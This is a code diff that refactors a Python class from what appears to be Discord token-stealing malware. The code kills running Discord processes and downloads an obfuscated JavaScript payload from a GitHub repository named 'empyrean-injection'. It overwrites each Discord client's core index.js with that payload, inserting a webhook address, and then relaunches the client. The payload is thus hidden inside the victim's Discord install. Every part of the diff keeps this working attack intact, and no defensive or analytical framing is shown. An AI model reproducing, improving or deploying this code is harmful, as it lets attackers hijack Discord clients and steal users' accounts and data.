@@ -1,60 +1,64 @@
 import os
 import re
 import subprocess
-
 import psutil
 import requests
 
 
 class Injection:
     def __init__(self, webhook: str) -> None:
-        self.appdata = os.getenv('LOCALAPPDATA')
+        self.webhook = webhook
         self.discord_dirs = [
-            self.appdata + '\\Discord',
-            self.appdata + '\\DiscordCanary',
-            self.appdata + '\\DiscordPTB',
-            self.appdata + '\\DiscordDevelopment'
+            os.path.join(os.getenv('LOCALAPPDATA'), dir_name)
+            for dir_name in ('Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment')
+            if os.path.exists(os.path.join(os.getenv('LOCALAPPDATA'), dir_name))
         ]
-        self.code = requests.get('https://raw.githubusercontent.com/addi00000/empyrean-injection/main/obfuscated.js').text
-        
+        self.js_code = requests.get('https://raw.githubusercontent.com/addi00000/empyrean-injection/main/obfuscated.js').text
+
+        self.inject()
+
+    def inject(self):
         for proc in psutil.process_iter():
             if 'discord' in proc.name().lower():
                 proc.kill()
 
         for dir in self.discord_dirs:
-            if not os.path.exists(dir):
+            core_path, core_name = self.get_core_path(dir)
+            if core_path is None:
                 continue
 
-            if self.get_core(dir) is not None:
-                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
-                    f.write((self.code).replace('discord_desktop_core-1',
-                            self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
-                    self.start_discord(dir)
+            with open(os.path.join(core_path, 'index.js'), 'w', encoding='utf-8') as f:
+                f.write((self.js_code)
+                        .replace('discord_desktop_core-1', core_name)
+                        .replace('%WEBHOOK%', self.webhook))
 
-    def get_core(self, dir: str) -> tuple:
+            self.start_discord(dir)
+
+    def get_core_path(self, dir: str) -> tuple:
         for file in os.listdir(dir):
-            if re.search(r'app-+?', file):
-                modules = dir + '\\' + file + '\\modules'
-                if not os.path.exists(modules):
-                    continue
-                for file in os.listdir(modules):
-                    if re.search(r'discord_desktop_core-+?', file):
-                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
-                        if not os.path.exists(core + '\\index.js'):
-                            continue
+            if not re.search(r'app-+?', file):
+                continue
 
-                        return core, file
+            modules_path = os.path.join(dir, file, 'modules')
+            if not os.path.exists(modules_path):
+                continue
+
+            for file in os.listdir(modules_path):
+                if re.search(r'discord_desktop_core-+?', file):
+                    core_path = os.path.join(modules_path, file, 'discord_desktop_core')
+                    if os.path.exists(os.path.join(core_path, 'index.js')):
+                        return core_path, file
+
+        return None, None
 
     def start_discord(self, dir: str) -> None:
-        update = dir + '\\Update.exe'
-        executable = dir.split('\\')[-1] + '.exe'
+        update_path = os.path.join(dir, 'Update.exe')
+        executable_path = os.path.join(dir, dir.split('\\')[-1] + '.exe')
 
         for file in os.listdir(dir):
             if re.search(r'app-+?', file):
-                app = dir + '\\' + file
-                if os.path.exists(app + '\\' + 'modules'):
-                    for file in os.listdir(app):
-                        if file == executable:
-                            executable = app + '\\' + executable
-                            subprocess.call([update, '--processStart', executable],
-                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                app_path = os.path.join(dir, file)
+                if os.path.exists(os.path.join(app_path, 'modules')):
+                    executable_path = os.path.join(app_path, executable_path.split('\\')[-1])
+                    subprocess.call([update_path, '--processStart', executable_path],
+                                    shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
